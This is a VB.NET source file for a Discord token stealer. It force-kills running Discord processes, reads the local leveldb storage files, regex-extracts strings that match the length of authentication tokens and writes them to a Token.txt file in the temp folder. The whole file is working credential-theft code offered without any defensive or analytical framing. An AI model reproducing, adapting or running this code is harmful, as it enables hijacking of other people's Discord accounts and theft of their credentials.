Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Text.RegularExpressions

Namespace Other
    Public Class DiscordToken
        Public Function GetToken()
            If KillDiscord() Then
                Dim files = SearchForFile()

                If files.Count = 0 Then
                    Return False
                Else
                    For Each token As String In files
                        For Each match As Match In Regex.Matches(token, "[^""]*")
                            If match.Length = 59 Then
                                Using sw As StreamWriter = New StreamWriter(Path.Combine(Path.GetTempPath, "Token.txt"), True)
                                    sw.WriteLine("Discord Token = " & match.ToString())
                                End Using
                            End If
                        Next
                    Next
                End If
                Return True
            End If
            Return True
        End Function

        Private Function SearchForFile() As List(Of String)
            Dim logFiles As List(Of String) = New List(Of String)()
            Dim discordPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\discord\Local Storage\leveldb\"

            If Not Directory.Exists(discordPath) Then
                Return logFiles
            End If

            For Each dbfile As String In getFiles(discordPath, "*.log|*.ldb", SearchOption.TopDirectoryOnly)
                Dim rawText As String = File.ReadAllText(dbfile)

                If rawText.Contains("oken") Then
                    logFiles.Add(rawText)
                End If
            Next
            Return logFiles
        End Function

        Private Function KillDiscord()
            Try
                If Process.GetProcessesByName("Discord").Length > 0 Then
                    Dim ProcessList() As Process = System.Diagnostics.Process.GetProcessesByName("Discord")
                    For Each proc As Process In ProcessList
                        proc.Kill()
                    Next
                    Return True
                Else
                    Return True
                End If
            Catch ex As Exception
                Return False
            End Try
        End Function

        Public Function getFiles(ByVal SourceFolder As String, ByVal Filter As String, ByVal searchOption As System.IO.SearchOption) As String()
            Dim alFiles As ArrayList = New ArrayList()
            Dim MultipleFilters() As String = Filter.Split("|")
            For Each FileFilter As String In MultipleFilters
                alFiles.AddRange(Directory.GetFiles(SourceFolder, FileFilter, searchOption))
            Next
            Return alFiles.ToArray(Type.GetType("System.String"))
        End Function
    End Class
End Namespace